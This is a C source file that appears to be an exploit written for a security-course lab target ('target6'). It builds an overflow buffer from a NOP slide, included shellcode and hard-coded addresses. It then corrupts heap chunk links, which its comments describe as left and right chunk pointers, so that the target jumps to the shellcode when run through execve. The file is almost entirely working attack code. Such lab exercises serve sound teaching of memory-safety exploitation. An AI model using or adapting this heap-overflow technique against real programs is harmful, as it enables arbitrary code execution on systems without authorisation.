#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"

#define NOP 0x090
#define NOPSLIDE 8

int main(void)
{
    char *args[3];
    char *env[1];

    int ripAddr = 0x2021fe68;
    int shellAddr = 0x104ee28;
    int overflowSize = 81;
    args[0] = TARGET; args[2] = NULL;
    env[0] = NULL;
    args[1] =  malloc(sizeof(char) * overflowSize); 
    
    int i = 0;
  
    for (i = 0; i < overflowSize; i++){
        args[1][i] = NOP;
    }
    for (i = NOPSLIDE; i < strlen(shellcode) + NOPSLIDE; ++i) {
        args[1][i] = shellcode[i-NOPSLIDE];    
    }
    
    int *ptr = (int * )&(args[1][overflowSize-5]);
    *ptr = ripAddr;
    ptr = (int * )&(args[1][overflowSize-9]);
    *ptr = shellAddr;
    
    args[1][overflowSize - 1] = '\0';
    args[1][4] = 0x91;
    
    
    if (0 > execve(TARGET, args, env))
      fprintf(stderr, "execve failed.\n");
  //start with 8 byte long nop slide
  //q -> left chunk at 0x0104ee70
  //q -> right chunk at 0x0104eef0
  // want left prev to point at shellcode
  // want right next to point at return address

  return 0;
}
